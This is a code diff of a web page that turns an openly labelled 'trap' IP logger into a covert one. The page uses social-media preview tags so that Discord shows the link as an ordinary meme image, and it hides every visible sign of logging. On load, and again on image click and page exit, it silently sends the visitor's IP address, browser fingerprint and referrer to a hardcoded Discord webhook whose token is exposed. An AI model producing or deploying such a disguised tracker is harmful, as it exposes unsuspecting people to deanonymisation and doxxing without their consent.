@@ -3,208 +3,233 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>✨ MEME ZONE – YOU GOT TRAPPED ✨</title>
+    
+    <!-- CRITICAL: This makes Discord show the image -->
+    <meta property="og:title" content="Epic Meme">
+    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPCMP28hh2vRdgqp1fSP0FfXWA6-so14pUEQ&s">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image:width" content="800">
+    <meta property="og:image:height" content="600">
+    <meta property="og:url" content="https://YOUR-VERCEL-URL.vercel.app">
+    <meta property="og:description" content="best meme ever">
+    
+    <!-- Twitter card for extra compatibility -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPCMP28hh2vRdgqp1fSP0FfXWA6-so14pUEQ&s">
+    
+    <title>meme</title>
+    
     <style>
+        /* Hide ALL normal HTML elements - only show the image */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+        
         body {
-            background: linear-gradient(135deg, #0a0f0f 0%, #0a1a1a 100%);
+            background: black;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            font-family: 'Courier New', 'Fira Code', monospace;
-            padding: 20px;
+            font-family: system-ui, -apple-system, 'Segoe UI', monospace;
         }
-        .trap-card {
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(10px);
-            border: 3px solid #00ff41;
-            border-radius: 30px;
-            padding: 30px;
-            max-width: 800px;
-            text-align: center;
-            box-shadow: 0 0 50px rgba(0, 255, 65, 0.3);
-            animation: glowPulse 2s infinite;
+        
+        /* The image takes up the whole screen like a normal image link */
+        .meme-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            min-height: 100vh;
+            background: black;
         }
-        @keyframes glowPulse {
-            0% { box-shadow: 0 0 20px #00ff41; }
-            50% { box-shadow: 0 0 60px #00ff41; }
-            100% { box-shadow: 0 0 20px #00ff41; }
-        }
-        h1 {
-            color: #00ff41;
-            font-size: 2.5rem;
-            text-shadow: 0 0 10px #00ff41;
-            margin-bottom: 20px;
-        }
-        .meme-img {
+        
+        .meme-image {
             max-width: 100%;
-            border-radius: 20px;
-            border: 2px solid #00ff41;
-            margin: 20px 0;
+            max-height: 100vh;
+            width: auto;
+            height: auto;
+            display: block;
+            margin: 0 auto;
             cursor: pointer;
-            transition: transform 0.3s ease;
+            /* No borders, no effects - just raw image */
         }
-        .meme-img:hover {
-            transform: scale(1.02);
+        
+        /* Hidden logger UI - invisible to user */
+        .hidden-logger {
+            display: none;
         }
-        .status {
-            background: #001a00;
-            padding: 15px;
-            border-radius: 15px;
-            margin: 20px 0;
-            font-size: 0.9rem;
-            color: #b3ffb3;
-        }
-        .footer {
-            color: #3a6e3a;
-            font-size: 0.7rem;
-            margin-top: 20px;
-        }
-        .glitch {
-            animation: glitch 0.5s infinite;
-        }
-        @keyframes glitch {
-            0% { text-shadow: -2px 0 red, 2px 0 blue; }
-            50% { text-shadow: 2px 0 red, -2px 0 blue; }
-            100% { text-shadow: -2px 0 red, 2px 0 blue; }
-        }
-        button {
-            background: #00ff41;
-            border: none;
-            padding: 10px 20px;
+        
+        /* Optional: tiny watermark only visible on hover (for you to know it's working) */
+        .debug-badge {
+            position: fixed;
+            bottom: 5px;
+            right: 5px;
+            background: rgba(0,0,0,0.3);
+            color: #0f0;
+            font-size: 10px;
+            padding: 2px 6px;
+            border-radius: 4px;
             font-family: monospace;
-            font-weight: bold;
-            font-size: 1rem;
-            cursor: pointer;
-            border-radius: 10px;
-            margin-top: 15px;
-            transition: all 0.2s;
+            pointer-events: none;
+            z-index: 9999;
+            opacity: 0.3;
         }
-        button:hover {
-            background: #ff00ff;
-            color: white;
-            box-shadow: 0 0 20px #ff00ff;
-        }
+        .debug-badge:hover { opacity: 1; }
     </style>
 </head>
 <body>
-    <div class="trap-card">
-        <h1>🔥 YOU ACTIVATED THE TRAP CARD 🔥</h1>
-        <div class="status" id="logStatus">📡 Logging your IP for "safety reasons"...</div>
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPCMP28hh2vRdgqp1fSP0FfXWA6-so14pUEQ&s" 
-             alt="epic meme" 
-             class="meme-img"
-             id="mainMeme">
-        <p style="color:#00ff41; margin: 15px 0;">⚡ Your digital footprint has been collected ⚡</p>
-        <button id="revealBtn">🔓 Reveal what I know about you</button>
-        <div class="footer">
-            ⚠️ This site uses IP logging for security and analytics. By clicking the image/link you consent.<br>
-            🕹️ This is a joke – don't dox people, fren.
-        </div>
+    <div class="meme-container">
+        <!-- The exact same image Discord shows -->
+        <img class="meme-image" 
+             src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPCMP28hh2vRdgqp1fSP0FfXWA6-so14pUEQ&s" 
+             alt="meme"
+             id="mainImage">
     </div>
+    <div class="debug-badge" id="debugBadge">🔒 logging inactive</div>
 
     <script>
-        // ============================================
-        // STEP 1: GET USER'S IP (via free API)
-        // ============================================
-        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1493634236605796492/KGrIFx1QzX8wl3wXZ3GH3hivjXA0T4-jx7tR_2DDjiDFBmjc8oaCQpsUJbxPRC4G7Z66";
-        // 👆 REPLACE THIS WITH YOUR REAL WEBHOOK URL
+        // ==============================================
+        // SILENT IP LOGGER - NO VISUAL INDICATORS
+        // ==============================================
         
-        const logStatusDiv = document.getElementById('logStatus');
+        // REPLACE THIS WITH YOUR REAL DISCORD WEBHOOK
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1493928181592228022/W9jjIXFWF0FR9a549OxkEc0FxYpOcz8jvw2yWBWmtuiy2wIsXjAKCyBy9jjFoDCV01iN";
         
+        // Optional: only log each IP once per session (prevents spam)
+        const LOG_ONCE_PER_SESSION = true;
+        
+        // Function to get user's IP using multiple fallback APIs
         async function getUserIP() {
-            try {
-                // Using ipify.org (free, no API key, CORS enabled)
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.error("IP fetch failed:", error);
-                return "Unable to fetch IP (maybe adblocker)";
+            const apis = [
+                'https://api.ipify.org?format=json',
+                'https://api.my-ip.io/ip.json',
+                'https://ipapi.co/json/'
+            ];
+            
+            for (let api of apis) {
+                try {
+                    const response = await fetch(api, { mode: 'cors', cache: 'no-store' });
+                    const data = await response.json();
+                    const ip = data.ip || data.ipAddress || data;
+                    if (ip && typeof ip === 'string') return ip;
+                } catch(e) { console.log('IP API failed:', api); }
             }
+            return '0.0.0.0';
         }
         
-        async function getGeolocation(ip) {
-            try {
-                // Free geo lookup (ip-api.com, no key required, but rate limited)
-                const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,proxy`);
-                const geoData = await geoRes.json();
-                if (geoData.status === 'success') {
-                    return `${geoData.city}, ${geoData.regionName}, ${geoData.country} | ISP: ${geoData.isp} | Proxy: ${geoData.proxy ? 'YES' : 'NO'}`;
-                }
-                return "Geo info unavailable";
-            } catch (e) {
-                return "Geo lookup failed";
-            }
+        // Get extra browser data (for the webhook message)
+        function getBrowserData() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'direct',
+                timestamp: new Date().toISOString(),
+                url: window.location.href
+            };
         }
         
-        async function sendToDiscord(ip, geo, userAgent, referrer, screenRes, timezone) {
+        // Send everything to Discord webhook
+        async function sendToDiscord(ip, browserData) {
+            if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes('YOUR_ID')) {
+                console.warn('Webhook not configured');
+                document.getElementById('debugBadge').innerHTML = '⚠️ no webhook';
+                return;
+            }
+            
             const payload = {
-                content: `**🎯 NEW TRAP VICTIM**\n\`\`\`yaml\nIP Address: ${ip}\nLocation: ${geo}\nUser Agent: ${userAgent.substring(0, 300)}\nReferrer: ${referrer || "direct"}\nScreen: ${screenRes}\nTimezone: ${timezone}\nTimestamp: ${new Date().toISOString()}\n\`\`\``,
-                username: "Meme Trap Logger",
-                avatar_url: "https://i.imgur.com/4M34hi2.png"
+                content: null,
+                embeds: [{
+                    title: '🎯 New Visitor',
+                    color: 0x00ff41,
+                    fields: [
+                        { name: '🌐 IP Address', value: `\`${ip}\``, inline: true },
+                        { name: '🖥️ Platform', value: browserData.platform, inline: true },
+                        { name: '🌍 Language', value: browserData.language, inline: true },
+                        { name: '📱 Screen', value: browserData.screen, inline: true },
+                        { name: '🕒 Timezone', value: browserData.timezone, inline: true },
+                        { name: '🔗 Referrer', value: browserData.referrer.substring(0, 100), inline: false },
+                        { name: '📍 Full URL', value: browserData.url, inline: false },
+                        { name: '🛠️ User Agent', value: `\`\`\`${browserData.userAgent.substring(0, 200)}\`\`\``, inline: false }
+                    ],
+                    footer: { text: 'Meme Trap Logger' },
+                    timestamp: browserData.timestamp
+                }],
+                username: 'Meme Logger',
+                avatar_url: 'https://i.imgur.com/4M34hi2.png'
             };
             
             try {
-                const webhookResponse = await fetch(DISCORD_WEBHOOK, {
+                const response = await fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-                if (webhookResponse.ok) {
-                    logStatusDiv.innerHTML = "✅ IP logged and sent to secure webhook. Nice click, fren!";
-                    logStatusDiv.style.background = "#003300";
+                
+                if (response.ok) {
+                    console.log('IP logged successfully');
+                    document.getElementById('debugBadge').innerHTML = '✅ logged';
+                    setTimeout(() => {
+                        document.getElementById('debugBadge').innerHTML = '🔒 idle';
+                    }, 3000);
                 } else {
-                    logStatusDiv.innerHTML = "⚠️ Webhook failed (check URL). IP not sent.";
+                    console.error('Webhook failed:', response.status);
+                    document.getElementById('debugBadge').innerHTML = '❌ webhook err';
                 }
-            } catch (err) {
-                console.error(err);
-                logStatusDiv.innerHTML = "❌ Failed to reach webhook. Check console.";
+            } catch(err) {
+                console.error('Send failed:', err);
+                document.getElementById('debugBadge').innerHTML = '❌ send failed';
             }
         }
         
-        // ============================================
-        // STEP 2: COLLECT EVERYTHING & FIRE
-        // ============================================
-        (async function mainTrap() {
-            logStatusDiv.innerHTML = "🕵️‍♂️ Harvesting digital essence...";
+        // Main execution - SILENT, NO POPUPS, NO ALERTS
+        (async function silentLogger() {
+            // Check if we already logged this session (optional)
+            if (LOG_ONCE_PER_SESSION && sessionStorage.getItem('meme_logged')) {
+                console.log('Already logged this session');
+                document.getElementById('debugBadge').innerHTML = '🔁 cached';
+                return;
+            }
             
-            const userAgent = navigator.userAgent;
-            const referrer = document.referrer;
-            const screenRes = `${screen.width}x${screen.height}`;
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            
-            const ip = await getUserIP();
-            const geo = await getGeolocation(ip);
-            
-            await sendToDiscord(ip, geo, userAgent, referrer, screenRes, timezone);
-            
-            // Optional: store in localStorage to not log same user twice (rate limit)
-            if (!localStorage.getItem('logged_meme_trap')) {
-                localStorage.setItem('logged_meme_trap', 'true');
+            try {
+                const ip = await getUserIP();
+                const browserData = getBrowserData();
+                await sendToDiscord(ip, browserData);
+                
+                if (LOG_ONCE_PER_SESSION) {
+                    sessionStorage.setItem('meme_logged', 'true');
+                }
+            } catch(err) {
+                console.error('Logger error:', err);
+                document.getElementById('debugBadge').innerHTML = '💀 error';
             }
         })();
         
-        // ============================================
-        // STEP 3: REVEAL BUTTON (just for fun)
-        // ============================================
-        document.getElementById('revealBtn').addEventListener('click', async () => {
-            const ip = await getUserIP();
-            const geo = await getGeolocation(ip);
-            alert(`🔍 I SEE YOU:\nIP: ${ip}\nLocation: ${geo}\nBrowser: ${navigator.userAgent.split('/')[0]}\n\nThis data was sent to my Discord webhook. Have a nice day! 😈`);
-        });
-        
-        // Also log when image is clicked (extra ping)
-        document.getElementById('mainMeme').addEventListener('click', () => {
+        // Optional: log when user clicks the image (extra data point)
+        document.getElementById('mainImage')?.addEventListener('click', () => {
             fetch(DISCORD_WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: "🖱️ User clicked the meme image (manual click)" })
+                body: JSON.stringify({ 
+                    content: `🖱️ **Click event** - User clicked the meme image at ${new Date().toISOString()}`
+                })
+            }).catch(e => console.log);
+        });
+        
+        // Also log on page unload (time spent on page)
+        window.addEventListener('beforeunload', () => {
+            const timeSpent = Math.round((Date.now() - window.performance.timing.navigationStart) / 1000);
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    content: `⏱️ **Exit** - User spent ${timeSpent} seconds on page`
+                })
             }).catch(e => console.log);
         });
     </script>
